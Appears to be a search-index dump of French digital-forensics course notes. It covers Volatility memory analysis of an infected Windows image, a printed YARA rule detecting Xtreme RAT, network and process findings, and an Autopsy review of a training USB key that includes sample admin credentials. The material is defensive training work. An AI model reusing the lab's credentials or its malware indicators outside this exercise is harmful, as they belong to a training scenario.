Information Windows C'est la partition C: ! 3.2 Analyse avec autopsy : Cr\u00e9er la timeline Analise avec clamav clamscan -i -r /mnt/partitionC/ > scanAV.txt Firefox crach report Il peut-\u00eatre utile de regarder les crash reports, lors d'une tentative d'exploitation il est possible de g\u00e9n\u00e9rer des crashs.","title":"Evidence"},{"location":"forensic/Evidence/#1-prerequis","text":"D\u00e9chiffrer l'image avec GPG : gpg Evidence.vmdk_bak.gpg Ensuite, je rattache le VMDK d\u00e9chiffr\u00e9 \u00e0 la machine sur VMWARE Caine. Je monte le disdque avec Mounted (petit truc vert en bas \u00e0 gauche dans Caine). Je v\u00e9rifie le hash de l'image : sudo md5sum /media/sdb1/Windows/memory.img 04b16c5a3ae70bef40e120fc821bee85 sudo md5sum /media/sdb1/Windows/disk.raw 415689cdfb3928e10a9f3786bb650e05 04b16c5a3ae70bef40e120fc821bee85 memory.img 415689cdfb3928e10a9f3786bb650e05 disk.raw","title":"1 Pr\u00e9requis :"},{"location":"forensic/Evidence/#2-analyse-de-la-ram","text":"Je d\u00e9termine l'uimage info de la RAM : /home/student/training/tools/volatility -f /media/sdb1/Windows/memory.img imageinfo Retour de volatility : Volatility Foundation Volatility Framework 2.5 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win10x86, Win8SP0x86, Win81U1x86, Win8SP1x86, Win10x86_44B89EEA AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/media/sdb1/Windows/memory.img) PAE type : PAE DTB : 0x1a8000L KDBG : 0x82461820L Number of Processors : 1 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0x8248b000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2016-08-17 12:00:47 UTC+0000 Image local date and time : 2016-08-17 14:00:47 +0200 ````` Comme on sais que c'est du Windows, on lance la commande pslist : ````bash time /home/student/training/tools/volatility -f /media/sdb1/Windows/memory.img pslist ````` Ca n'a pas march\u00e9 il faut utiliser autre chose : `````bash time /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --profile=Win10x86 pslist # 11 secondes time /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --profile=Win8SP0x86 pslist # 19 secondes time /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --profile=Win10x86_44B89EEA pslist # 7 secondes ````` Avec le dernier profile ca a bien march\u00e9 pas de probl\u00e8me d'encodage des carct\u00e8res comme avec les deux premiers profils. Ensuite, on essaye \u00e0 partir des adresses des pointeurs (DTB,KDBG, KPCR) retourner les processus : `````bash time /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --dtb 0x1a8000 --kdbg 0x82461820 --kpcr 0x8248b000 --profile=Win10x86_44B89EEA pslist # 2 secondes ````` Si on est sur des machines Windowsdans la r\u00e9alit\u00e9, il feut prendre le temps de sp\u00e9cifier les param\u00e8tres **DTB**, **KDBG**, **KPCR** ca va aller beacoup plus vite. Dans notre cas en sp\u00e9cifiant les param\u00e8tres on \u00e0 mis **2 secondes** la ou on met **7 secondes** sans ces param\u00e8tres. Ensuite on l'enregistre dans les variables d'environment pour ne pas avoir a tout retaper : ````bash alias vol=\"sudo /home/student/training/tools/volatility/vol.py -f /media/sdb1/Windows/memory.img --profile=Win10x86_44B89EEA --dtb=0x1a8000 --kdbg=0x82461820 --kpcr=0x8248b000\" Ce qui nous permet de tapper vol commande sans avoir \u00e0 tout retaper. vol pslist Retour : Volatility Foundation Volatility Framework 2.5 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x868a7700 System 4 0 104 0 ------ 0 2016-08-16 12:54:24 UTC+0000 0x8d2af5c0 smss.exe 244 4 2 0 ------ 0 2016-08-16 12:54:24 UTC+0000 0x8f7e3040 csrss.exe 324 316 10 0 0 0 2016-08-16 12:54:27 UTC+0000 0x9487c640 smss.exe 388 244 0 -------- 1 0 2016-08-16 12:54:28 UTC+0000 2016-08-16 12:54:28 UTC+0000 0x8b9bf300 wininit.exe 396 316 2 0 0 0 2016-08-16 12:54:28 UTC+0000 0x8f71d2c0 csrss.exe 408 388 11 0 1 0 2016-08-16 12:54:28 UTC+0000 0x94863c40 winlogon.exe 460 388 4 0 1 0 2016-08-16 12:54:28 UTC+0000 0x8b9bc300 services.exe 488 396 6 0 0 0 2016-08-16 12:54:29 UTC+0000 0x948c3040 lsass.exe 516 396 7 0 0 0 2016-08-16 12:54:29 UTC+0000 0x948fb180 svchost.exe 576 488 19 0 0 0 2016-08-16 12:54:30 UTC+0000 0x94954380 svchost.exe 620 488 10 0 0 0 2016-08-16 12:54:30 UTC+0000 0x949bdc40 dwm.exe 716 460 13 0 1 0 2016-08-16 12:54:31 UTC+0000 0x949b08c0 svchost.exe 764 488 16 0 0 0 2016-08-16 12:54:31 UTC+0000 0x9495d6c0 svchost.exe 800 488 46 0 0 0 2016-08-16 12:54:31 UTC+0000 0x949d3040 svchost.exe 848 488 24 0 0 0 2016-08-16 12:54:31 UTC+0000 0x949d3c40 svchost.exe 856 488 10 0 0 0 2016-08-16 12:54:31 UTC+0000 0x949faac0 svchost.exe 896 488 22 0 0 0 2016-08-16 12:54:31 UTC+0000 0x94ca1700 svchost.exe 1068 488 24 0 0 0 2016-08-16 12:54:32 UTC+0000 0x94caf040 svchost.exe 1132 488 24 0 0 0 2016-08-16 12:54:32 UTC+0000 0x9a018040 spoolsv.exe 1212 488 10 0 0 0 2016-08-16 12:54:32 UTC+0000 0x9a039040 svchost.exe 1380 488 12 0 0 0 2016-08-16 12:54:34 UTC+0000 0x9a118380 svchost.exe 1540 488 7 0 0 0 2016-08-16 12:54:34 UTC+0000 0x9a10cb00 wlms.exe 1572 488 4 0 0 0 2016-08-16 12:54:34 UTC+0000 0x9c64f980 sihost.exe 688 800 12 0 1 0 2016-08-16 12:55:35 UTC+0000 0x8c13ea00 taskhostw.exe 268 800 9 0 1 0 2016-08-16 12:55:36 UTC+0000 0x8ad6c040 userinit.exe 1556 460 0 -------- 1 0 2016-08-16 12:55:36 UTC+0000 2016-08-16 12:55:59 UTC+0000 0x8ac4a040 explorer.exe 2068 1556 57 0 1 0 2016-08-16 12:55:36 UTC+0000 0x8ad60940 RuntimeBroker. 2196 576 21 0 1 0 2016-08-16 12:55:37 UTC+0000 0x8ad5f040 SkypeHost.exe 2220 576 10 0 1 0 2016-08-16 12:55:37 UTC+0000 0x8ad22c40 ShellExperienc 2432 576 38 0 1 0 2016-08-16 12:55:39 UTC+0000 0x8b8520c0 SearchIndexer. 2532 488 17 0 0 0 2016-08-16 12:55:40 UTC+0000 0x8b8fb8c0 OneDrive.exe 3592 2068 14 0 1 0 2016-08-16 12:55:57 UTC+0000 0x9c68ec40 fontdrvhost.ex 4428 460 6 0 1 0 2016-08-16 12:57:09 UTC+0000 0x9c728480 svchost.exe 4900 488 3 0 1 0 2016-08-16 12:57:21 UTC+0000 0x8ad86c40 Skype.exe 5128 4696 64 0 1 0 2016-08-16 12:57:42 UTC+0000 0x8c0c9240 TrustedInstall 6108 488 4 0 0 0 2016-08-16 12:58:24 UTC+0000 0x8c0ba9c0 TiWorker.exe 6140 576 5 0 0 0 2016-08-16 12:58:25 UTC+0000 0x9d489780 SystemSettings 2144 576 4 0 1 0 2016-08-16 12:59:36 UTC+0000 0x9499ac40 ApplicationFra 1696 576 5 0 1 0 2016-08-16 12:59:48 UTC+0000 0x9c629300 SystemSettings 5268 5252 4 0 1 0 2016-08-16 12:59:51 UTC+0000 0xb0d47780 svchost.exe 4888 4748 2 0 1 0 2016-08-16 13:02:57 UTC+0000 0x9d5e74c0 explorer.exe 4872 4748 3 0 1 0 2016-08-16 13:02:58 UTC+0000 0x9c7d7c40 svchost.exe 2168 5860 2 0 1 0 2016-08-16 13:03:04 UTC+0000 0xb0c96740 update.exe 5172 5860 6 0 1 0 2016-08-16 13:03:04 UTC+0000 0xd0d9f600 cmd.exe 1976 5172 0 -------- 1 0 2016-08-16 13:04:47 UTC+0000 2016-08-16 13:07:36 UTC+0000 0x9d5ba900 cmd.exe 736 5172 0 -------- 1 0 2016-08-16 13:07:40 UTC+0000 2016-08-16 13:43:12 UTC+0000 0xbac89640 SystemSettings 4968 576 26 0 1 0 2016-08-16 13:41:14 UTC+0000 0xbad4b040 cmd.exe 2748 5172 0 -------- 1 0 2016-08-16 13:50:51 UTC+0000 2016-08-16 14:08:30 UTC+0000 0xbf755c40 cmd.exe 5280 5172 0 -------- 1 0 2016-08-16 14:17:24 UTC+0000 2016-08-16 14:18:48 UTC+0000 0x8b8c44c0 cmd.exe 868 5172 0 -------- 1 0 2016-08-16 14:19:45 UTC+0000 2016-08-16 14:23:02 UTC+0000 0xd53d2c40 cmd.exe 3540 5172 0 -------- 1 0 2016-08-16 14:23:05 UTC+0000 2016-08-16 14:23:46 UTC+0000 0xd5321480 SearchUI.exe 7360 576 26 0 1 0 2016-08-16 18:13:21 UTC+0000 0x9c6a8040 audiodg.exe 18084 848 7 0 0 0 2016-08-17 12:00:20 UTC+0000 0xc8606c40 RamCapture.exe 16740 2068 4 0 1 0 2016-08-17 12:00:36 UTC+0000 0xd53a3500 conhost.exe 16756 16740 2 0 1 0 2016-08-17 12:00:36 UTC+0000 0x9c61a300 SearchProtocol 15756 2532 7 0 ------ 0 2016-08-17 12:00:50 UTC+0000 0xc7fa2a40 SearchFilterHo 14288 2532 5 0 ------ 0 2016-08-17 12:00:50 UTC+0000 0xe2df3040 MusNotificatio 16968 800 1 0 ------ 0 2016-08-18 09:25:38 UTC+0000 0xb0df7040 ?q???q?? 0 0 22...6 -------- ------ 0 Utilisation des YARA rules : cd /home/student/training/ex1/yara-rules vol yarascan -y index.yar > /home/student/yara.text J'all\u00e8ge un peux l'index .yar pour avoir uniquement les CVE, les malware et les Exploits-Kits : cd /home/student/training/ex1/yara-rules find CVE_Rules/ Exploit-Kits/ malware/ -name \"*.yar\" -exec echo include \\\"`pwd`/{}\\\" \\; > test.yar Je relance ma commande avec mon yara all\u00e9g\u00e9 : vol yarascan -y test.yar > /home/student/yara-out.txt Obtenir un r\u00e9sum\u00e9 des r\u00e8gles d\u00e9tecter par YARA rules : grep 'Rule:' yara-out.txt | sort | uniq -c Retour : 15 Rule: SharedStrings 3 Rule: spyeye_plugins 9 Rule: UPX 51 Rule: with_sqlite 18 Rule: Xtreme 9 Rule: xtreme_rat 19 Rule: xtremrat Bon on a des RAT ca c'est inqui\u00e9tant, ce qui peut \u00eatre int\u00e9r\u00e9ssant de voir cart on a 15 share string c'est de voir le contenu de ce qui \u00e0 topper cette cat\u00e9gorie. Retour des sharedStrings : cd /home/student/ grep -Rl 'rule SharedStrings' * cd /home/student/training/ex1/yara-rules Retour : training/ex1/yara-rules/malware/MALW_LURK0.yar Cette YARA rule liste plsuieurs IOC, dans notrze cas on \u00e0 juste les donn\u00e9es E..R , qui ont permis de matcher pour les SharedStrintgs. A chaque fois que l'on match sur une YARA rule il faut regarder plus en profondeur pour d\u00e9terminer si c'est un faux positif. Dans notre casx la c'etait un faux positif. R\u00e9sum\u00e9 : * On a d\u00e9terminer l'image de Windows pr\u00e9cisement par le temps qul profil \u00e9tait le plus rapide est lequel n'afficher pas des ? , * On \u00e0 determiner le DTB , KDBG , KPCR diminuer le temps de traitement des recherche dans la RAM, * On a vu avec les grep les r\u00e8gles qui ont \u00e9t\u00e9 d\u00e9tect\u00e9 par les YARA rules (RAT -> critique), * On a regarder la YARA rule en relation avec Shared Strings, * On a d\u00e9termin\u00e9 que c'est un faux positif pour les shared strings, Exercice analyse avec les autres autres alertes. Avec l'alerte xtreme_rat : grep -Rl 'rule xtreme_rat' * cd /home/student/training/ex1/yara-rules Retour : training/ex1/yara-rules/malware/RAT_Xtreme.yar Identification de la r\u00e8le dans le fichier : cat training/ex1/yara-rules/malware/RAT_Xtreme.yar Voci la YARA rule de d\u00e9tection pour xtreme_rat : rule xtreme_rat : Trojan { meta: author=\"Kevin Falcoz\" date=\"23/02/2013\" description=\"Xtreme RAT\" strings: $signature1={58 00 54 00 52 00 45 00 4D 00 45} /*X.T.R.E.M.E*/ condition: $signature1 } Identification des processus : Process svchost.exe Pid 4888 Process explorer.exe Pid 4872 Process update.exe Pid 5172 Avec l'alerte UPX : grep -Rl 'rule UPX' * cd /home/student/training/ex1/yara-rules Retour : training/ex1/yara-rules/malware/RAT_Ratdecoders.yar Identification des process : grep -i -A 1 'UPX' /home/student/yara-out.txt | grep Owner | uniq -c Retour : 3 Owner: Process svchost.exe Pid 4888 3 Owner: Process explorer.exe Pid 4872 3 Owner: Process update.exe Pid 5172 Avec l'alerte xtremrat : grep -Rl 'rule xtremrat' * cd /home/student/training/ex1/yara-rules Retour : training/ex1/yara-rules/malware/RAT_Xtreme.yar Identification des process : grep -i -A 1 'xtremrat' /home/student/yara-out.txt | grep Owner | uniq -c Retour : 11 Owner: Process explorer.exe Pid 4872 8 Owner: Process update.exe Pid 5172 On a trouv\u00e9 beaucoup d'occupances pour * SQLite - non explor\u00e9 \u00e0 ce jour * Shared Strings, probablement faux positif (STRINg E.R trop g\u00e9nrique) * SpyEye, probablement un faux positif vu les chaines recherch\u00e9es * Un packet d\u00e9tect\u00e9 (UPX) * probable rat xtrem_rat On se concentre sur les processus infect\u00e9s par le packer et le xtrem_rat PID 4888 (svchost) PID 4872 explorer PID 5172 update SQLITE difficiele de dire si c'est des vrais postifis ou pas. Refaire la timeline de l'atatque. R\u00e9sum\u00e9 : : J'ai v\u00e9rifi\u00e9 le MD5 du dump disk et lm\u00e9moire (ok) Mettre les valeurs des hash On a trouv\u00e9 l'empreinte de l'os avec le plugin imageinfo Win10_ ???? On a trouv\u00e9 DTB KPCR et cpi citer les adresses m\u00e9moire Nous avons appliqu\u00e9 les yara rules sur le dump m\u00e9moire, en nous concentrant sur: CVE, malware, packers On a trouv\u00e9 beaucoup d'occupances pour SQLite - non explor\u00e9 \u00e0 ce jour Shared Strings, probablement faux positif (STRINg E.R trop g\u00e9nrique) SpyEye, probablement un faux positif vu les chaines recherch\u00e9es Un packet d\u00e9tect\u00e9 (UPX) probable rat xtrem_rat On se concentre sur les processus infect\u00e9s par le packer et le xtrem_rat PID 4888 (svchost) PID 4872 explorer PID 5172 update","title":"2 Analyse de la RAM :"},{"location":"forensic/Evidence/#21-retracer-la-timeline-de-lattaque","text":"Observer le sprocessus : vol pslist Un ligne est int\u00e9r\u00e9ssante : 0x868a7700 System 4 0 104 0 ------ 0 2016-08-16 12:54:24 UTC+0000 ````` Le processus **System** est le premier processus qui d\u00e9marre lors du d\u00e9marrage du syst\u00e8me. Donc le syst\u00e8me \u00e0 boot le 16 Aout 2016 \u00e0 12:54:24. Ensuite, les serices applicatifs d\u00e9marre chacun leurs tour. Voci les processus que l'on suspecte : * svchost.exe, * explorer.exe, * update.exe, * 6 processus cmd.exe, On peux remarquer que le PPID des processus **cmd.exe** est identique entre tous les process, le PPID **5172** qui correspond au processus **update.exe**. Donc : * BOOT PC, System : 2016-08-16 12:54:24 UTC+0000 * UPDATE.EXE : 2016-08-16 13:03:04 UTC+0000 Nosu pouvons observer que le processus UOPDATE.EXE lance un processus CMD.EXE toutes les 3 minutes, c'est louche... Ce qui est int\u00e9r\u00e9ssant d'observer c'est comment les processus ont \u00e9t\u00e9 lanc\u00e9 : * Pour svchost.exe ````bash vol dlllist -p 4888 | grep 'Command line' Retour : Command line : svchost.exe Il \u00e0 \u00e9t\u00e9 lanc\u00e9 par la CLI. Pour update.exe : vol dlllist -p 5172 | grep 'Command line' Retour : Command line : C:\\Users\\Peter\\AppData\\Roaming\\HostData\\update.exe Il \u00e0 \u00e9t\u00e9 lanc\u00e9 par la CLI. Bizzard update.exe se trouve dans uh r\u00e9pertoire ou il ne doit pas \u00eatre normalement... Pour explorer.exe : vol dlllist -p 4872| grep 'Command line' Retour : Command line : explorer.exe Il \u00e0 \u00e9t\u00e9 lanc\u00e9 par la CLI.","title":"2.1 Retracer la timeline de l'attaque :"},{"location":"forensic/Evidence/#22-analyse-des-processus","text":"","title":"2.2 Analyse des processus :"},{"location":"forensic/Evidence/#221-explorerexe","text":"Pour explorer.exe : vol pslist | egrep '(Name|explorer.exe)' Retour : explorer.exe 2068 explorer.exe 4872 Bizzard deux processus explorer.exe alors que normalement il n'y en a q'un ! Le PPID de 2068 est 1156 : vol pslist | grep 1556 Retour : userinit.exe 1556 C'est un peu plus coh\u00e9rant... On a possiblement identifi\u00e9 : * Un processus explorer.exe, sain PID:2068 * Un processus explorer.exe, v\u00e9rol\u00e9 PID:4872 Tr\u00e8s probablement il y a un mecanisme qui permet de cr\u00e9er deux process explorer.exe.","title":"2.2.1 EXPLORER.EXE :"},{"location":"forensic/Evidence/#221-updateexe","text":"On a qu'un procesuss UDATE.EXE -> OK","title":"2.2.1 UPDATE.EXE :"},{"location":"forensic/Evidence/#23-analyse-reseau","text":"vol netscan Lorsque le PID == -1 c'est que volatility n'arrive pas a retrouver el PID du processus... On peux noter l'utilisation de ports de destination \u00e9trange 12345 alors que la connexion est en \u00e9tat ESTABLISHED et a chaque fois on a pas l'@ IP de destination... Recherche sp\u00e9cifique sur le port de destination 12345 , a noter le port de destination 33033 est \u00e9trange... : vol netscan | egrep '(State|:12345|:33033)' Retour : 192.168.5.100:59220 -:12345 ESTABLISHED -1 192.168.5.100:59271 -:12345 ESTABLISHED -1 192.168.5.100:59268 -:33033 CLOSED -1 Ok, on a vu des ports de destination 80 et 443 ... analyse de ces connexions : vol netscan | egrep '(State|:80|:443)' Retour : Offset(P) Proto Local Address Foreign Address State Pid 0x85b63230 TCPv4 192.168.5.100:59280 -:443 ESTABLISHED -1 0x86963230 TCPv4 192.168.5.100:59280 -:443 ESTABLISHED -1 0x8ad0bc30 TCPv4 192.168.5.100:59277 0.0.0.29:80 ESTABLISHED -1 0x9a1e2c00 TCPv4 192.168.5.100:49864 -:443 ESTABLISHED -1 0x9d5677b0 TCPv4 192.168.5.100:58959 0.0.0.0:443 ESTABLISHED -1 0xc6a21308 TCPv4 192.168.5.100:59250 -:443 ESTABLISHED -1 0xc7278c70 TCPv4 192.168.5.100:59265 -:443 ESTABLISHED -1 0xc7e81618 TCPv4 192.168.5.100:59246 -:443 ESTABLISHED -1 0xc7eeadf0 TCPv4 192.168.5.100:59234 -:443 ESTABLISHED -1 0xc7f9e760 TCPv4 192.168.5.100:59283 -:443 ESTABLISHED -1 0xd0d33008 TCPv4 192.168.5.100:59269 -:443 ESTABLISHED -1 0xe2d145c8 TCPv4 192.168.5.100:59274 -:443 CLOSED -1 Humm, \u00e0 chaque fois on a aucune IP de destination... Constat, \u00e0 chaque observation que l'on r\u00e9alise on n'arrive pas \u00e0 obtenir l'@IP de destination, ce qui est \u00e9trange surtout pour des connexions ESTABLISHED . G\u00e9n\u00e9ralement dans un CSIRT toutes les connexions sont trac\u00e9s avec diff\u00e9rentes statistiques (dur\u00e9es, taille des \u00e9changes, etc.). G\u00e9n\u00e9ralement les technologies derri\u00e8res sont : * SPLUNK Les donn\u00e9es des SWITCHS transitent avec NETFLOW, quipermet de logguer les connexions (ICMP,IP,TCP,UDP,etc.). dans notre cas, la seule chance possible de retrouver l'@ IP de destination c'est avec SPLUNK et NETFLOW. Pour r\u00e9sumer, je sais qu'un RAT \u00e0 \u00e9t\u00e9 d\u00e9ploy\u00e9 et que quelquechose de louche est pr\u00e9sente dans le r\u00e9pertoire Appdata gr\u00e2ce aux horodatage des processus.. Recherche avec malfind : vol malfind | grep Process Retour : Process: explorer.exe Pid: 2068 Address: 0x6660000 Process: explorer.exe Pid: 2068 Address: 0x72d0000 Process: Skype.exe Pid: 5128 Address: 0x1f0000 Process: explorer.exe Pid: 4872 Address: 0xc80000 Process: update.exe Pid: 5172 Address: 0x400000 Process: SearchUI.exe Pid: 7360 Address: 0xa7d0000 Process: SearchUI.exe Pid: 7360 Address: 0xc730000 Hum ca confirme nos hypoth\u00e8ses... Recherche des mutants, les mutants sont des handle qui change de structure et cela peut \u00eatre un IoC : vol mutantscan On retrouve skype, ce virus ne semble pas de passer par des mutex Pour conclure, on a une id\u00e9e assez pr\u00e9cise ou chercher, par le dump du disque, nous pourrons analyser plus en profondeur.","title":"2.3 Analyse r\u00e9seau :"},{"location":"forensic/Evidence/#3-analyse-du-disque","text":"","title":"3 Analyse du disque :"},{"location":"forensic/Evidence/#31-prerequis","text":"Analyse des partition dump du DD : mmls disk.raw Retour : Slot Start End Length Description 000: Meta 0000000000 0000000000 0000000001 Primary Table (#0) 001: ------- 0000000000 0000002047 0000002048 Unallocated 002: 000:000 0000002048 0001026047 0001024000 NTFS / exFAT (0x07) 003: 000:001 0001026048 0050329599 0049303552 NTFS / exFAT (0x07) 004: ------- 0050329600 0050331647 0000002048 Unallocated Deux partition NTFS, g\u00e9n\u00e9ralement la partition C: est la plus grande, je suppose donc que la partion C: est la n\u00b03. Pour monter la partiton, il faut pr\u00e9ciser \u00e0 partir de quel octet l'on souhaite commencer. La valeur Start dans le retour de mmls, correspond au num\u00e9ros de bloc, par d\u00e9faut dans Windows, les blocs sont de 512 Octets. Donc : 0001026048 * 512 = 525336576 Puis, monter la partition en RO mkdir /mnt/partitionC mount -t ntfs -o ro,offset=525336576 disk.raw /mnt/partitionC/ V\u00e9rification : ls /mnt/partitionC/ Retour : autoexec.bat BOOTNXT pagefile.sys ProgramData Recovery swapfile.sys Users bootmgr config.sys PerfLogs Program Files $Recycle.Bin System Volume Information Windows C'est la partition C: !","title":"3.1 Pr\u00e9requis :"},{"location":"forensic/Evidence/#32-analyse-avec-autopsy","text":"Cr\u00e9er la timeline","title":"3.2 Analyse avec autopsy :"},{"location":"forensic/Evidence/#analise-avec-clamav","text":"clamscan -i -r /mnt/partitionC/ > scanAV.txt","title":"Analise avec clamav"},{"location":"forensic/Evidence/#firefox-crach-report","text":"Il peut-\u00eatre utile de regarder les crash reports, lors d'une tentative d'exploitation il est possible de g\u00e9n\u00e9rer des crashs.","title":"Firefox crach report"},{"location":"forensic/autopsy/","text":"Autopsy start sudo autopsy http://localhost:9999/autopsy Les fichiers finissant par E** => Fichier cr\u00e9\u00e9 par le logiciel EnCase Suivre les \u00e9tapes Analyse d'une cl\u00e9 USB 1) A qui est cette cl\u00e9 ? Volume Label (Boot Sector): TERRYS WORK Cette cl\u00e9 appartient \u00e0 un certain \"Terry\" pour ses travaux 2) Ya-t-il sur cette cl\u00e9 des ex\u00e9cutables ? Oui il y en a : R54402.exe => Logiciel propri\u00e9taire DELL pour des drivers vnc-4_1_3-x86_win32.exe => Logiciel de prise de controle a distance xpadvancedkeylogger.exe => D\u00e9velopp\u00e9 par Eltima Software 3) Si oui sont-ils corrompus ? xpadvancedkeylogger.exe => html Virus total R54402.exe => R.A.S vnc-4_1_3-x86_win32.exe => 9 antivirus signal une menace, remote admin, me semble normal (faux positif) 4) Y a-t-il des images inappropri\u00e9es ? Liste d'images _M57biz.jpg 5) A quoi servait cette cl\u00e9 ? Notes Liste d'url Keylogger patentauto.py # Summary: MozRepl needs to telnet to the browser via port 4242. Once connected the port can program # can issue commands directly to the web browser. This program gets the list of urls from the text file. # Then randomly picks a URL and surfs it for background noise. if __name__ == \"__main__\": while(1): hour = time.localtime()[3] if (hour >= 9 and hour < 10) or (hour >= 14 and hour < 14) or (hour >= 16 and hour < 17): print \"Visiting Persona URLs...\" urlMain() if (hour >= 10 and hour < 12) or (hour >= 13 and hour < 16): print \"Patent Searching...\" patentMain() Fonction \u00e9trange avec les horraires credentials <BR> <b><font size=\"1\" face=\"Verdana\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></b> <font face=\"Verdana\" color=\"#000000\" size=\"2\">m57admin(EditBox)</font> <BR> <b><font size=\"1\" face=\"Verdana\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></b> <b><font face=\"Verdana\" color=\"#000000\" size=\"2\">admin01(Password EditBox)</font></b> <BR> <b><font size=\"1\" face=\"Verdana\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></b> <a hre","title":"Autopsy"},{"location":"forensic/autopsy/#autopsy","text":"","title":"Autopsy"},{"location":"forensic/autopsy/#start","text":"sudo autopsy http://localhost:9999/autopsy Les fichiers finissant par E** => Fichier cr\u00e9\u00e9 par le logiciel EnCase Suivre les \u00e9tapes","title":"start"},{"location":"forensic/autopsy/#analyse-dune-cle-usb","text":"1) A qui est cette cl\u00e9 ? Volume Label (Boot Sector): TERRYS WORK Cette cl\u00e9 appartient \u00e0 un certain \"Terry\" pour ses travaux 2) Ya-t-il sur cette cl\u00e9 des ex\u00e9cutables ? Oui il y en a : R54402.exe => Logiciel propri\u00e9taire DELL pour des drivers vnc-4_1_3-x86_win32.exe => Logiciel de prise de controle a distance xpadvancedkeylogger.exe => D\u00e9velopp\u00e9 par Eltima Software 3) Si oui sont-ils corrompus ? xpadvancedkeylogger.exe => html","title":"Analyse d'une cl\u00e9 USB"},{"location":"forensic/autopsy/#virus-total","text":"R54402.exe => R.A.S vnc-4_1_3-x86_win32.exe => 9 antivirus signal une menace, remote admin, me semble normal (faux positif) 4) Y a-t-il des images inappropri\u00e9es ?","title":"Virus total"},{"location":"forensic/autopsy/#liste-dimages","text":"_M57biz.jpg 5) A quoi servait cette cl\u00e9 ?","title":"Liste d'images"},{"location":"forensic/autopsy/#notes","text":"Liste d'url Keylogger patentauto.py # Summary: MozRepl needs to telnet to the browser via port 4242. Once connected the port can program # can issue commands directly to the web browser. This program gets the list of urls from the text file. # Then randomly picks a URL and surfs it for background noise. if __name__ == \"__main__\": while(1): hour = time.localtime()[3] if (hour >= 9 and hour < 10) or (hour >= 14 and hour < 14) or (hour >= 16 and hour < 17): print \"Visiting Persona URLs...\" urlMain() if (hour >= 10 and hour < 12) or (hour >= 13 and hour < 16): print \"Patent Searching...\" patentMain() Fonction \u00e9trange avec les horraires credentials <BR> <b><font size=\"1\" face=\"Verdana\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></b> <font face=\"Verdana\" color=\"#000000\" size=\"2\">m57admin(EditBox)</font> <BR> <b><font size=\"1\" face=\"Verdana\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></b> <b><font face=\"Verdana\" color=\"#000000\" size=\"2\">admin01(Password EditBox)</font></b> <BR> <b><font size=\"1\" face=\"Verdana\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></b> <a hre","title":"Notes"},{"location":"forensic/cours_forensic/","text":"Forensic Enquete scientifique La preuve de doit pas \u00eatre alt\u00e9r\u00e9e Pr\u00e9server l'information Forensic physique ADN Empreintes digitales Sang etc Forensic num\u00e9rique (informatique l\u00e9gale) Periph\u00e9rique de stockage Traces r\u00e9seaux Traces m\u00e9moire vive La gendarmerie met un ordi sous cell\u00e9 (toujours \u00e0 deux), le cache, signature. Conservation de la preuve La preuve ne doit jamais \u00eatre alt\u00e9r\u00e9e, m\u00eame de fa\u00e7on infime. Tra\u00e7abilit\u00e9 Obligatoire de tracer qui a fait quoi, quand. (chain of custody ) Phases de l'info l\u00e9gale 1) Conservation de la peuvre => aucun dommage / atlt\u00e9ration effectu\u00e9 sur la preuve 2) Recherche de preuve(s) 3) Reconstruction des evenements - reconstruire les evenements sur un plan chronologique suite aux preuves trouv\u00e9s => 2) Attaque info (incident/r\u00e9ponse) 1) Valider s'il sagit d'un incident (recherches pr\u00e9liminaires). - un serveur qui perd des fichiers => peut-\u00eatre un simple bug windows ou une attaque 2) Si c'est un incident - Pr\u00e9servation des donn\u00e9es et tra\u00e7abilit\u00e9 - Recherche de preuve - Remise en ordre des ev\u00eanements 3) Rapport complet Erreurs \u00e0 ne pas faire Red\u00e9marer la machine Allumer la machine Extraire le disque dur et le brancher en externe (antivirus va scan, windows monte en lecture/\u00e9criture), monter le disque en lecture/\u00e9criture Ne pas investiguer tout de suite ! On ne travail jamais sur la preuve, on la copie puis on taff dessus. Les bonnes pratiques Pour investiguer un disque dur il faut un HDD locker, c'est un chariot externe avec un syst\u00e8me qui emp\u00eache l'\u00e9criture sur le disque (electroniquement)","title":"Forensic"},{"location":"forensic/cours_forensic/#forensic","text":"Enquete scientifique La preuve de doit pas \u00eatre alt\u00e9r\u00e9e Pr\u00e9server l'information","title":"Forensic"},{"location":"forensic/cours_forensic/#forensic-physique","text":"ADN Empreintes digitales Sang etc","title":"Forensic physique"},{"location":"forensic/cours_forensic/#forensic-numerique-informatique-legale","text":"Periph\u00e9rique de stockage Traces r\u00e9seaux Traces m\u00e9moire vive La gendarmerie met un ordi sous cell\u00e9 (toujours \u00e0 deux), le cache, signature.","title":"Forensic num\u00e9rique (informatique l\u00e9gale)"},{"location":"forensic/cours_forensic/#conservation-de-la-preuve","text":"La preuve ne doit jamais \u00eatre alt\u00e9r\u00e9e, m\u00eame de fa\u00e7on infime.","title":"Conservation de la preuve"},{"location":"forensic/cours_forensic/#tracabilite","text":"Obligatoire de tracer qui a fait quoi, quand. (chain of custody )","title":"Tra\u00e7abilit\u00e9"},{"location":"forensic/cours_forensic/#phases-de-linfo-legale","text":"1) Conservation de la peuvre => aucun dommage / atlt\u00e9ration effectu\u00e9 sur la preuve 2) Recherche de preuve(s) 3) Reconstruction des evenements - reconstruire les evenements sur un plan chronologique suite aux preuves trouv\u00e9s => 2)","title":"Phases de l'info 